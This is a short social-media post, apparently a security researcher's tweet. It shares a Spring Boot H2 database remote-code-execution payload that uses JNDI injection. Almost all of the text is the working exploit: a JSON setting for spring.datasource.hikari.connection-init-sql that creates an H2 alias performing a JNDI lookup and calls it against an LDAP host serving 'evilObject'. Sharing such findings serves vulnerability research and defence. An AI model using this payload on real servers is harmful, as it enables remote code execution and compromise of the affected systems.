##User: pyn3rd	Time: 20200822
> 
``` {
  "name": "spring.datasource.hikari.connection-init-sql",
  "value": "CREATE ALIAS jndi AS $$ import javax.naming.InitialContext;@CODE String jndi(String url) throws Exception {new InitialContext().lookup(url);return null;}$$;CALL jndi('ldap://127.0.0.1:1389/evilObject');"
}```
  
  > 
``` Spring Boot H2 database Remote Code Execution involving JNDI injection pic.twitter.com/gPqys8DjfA```
  
  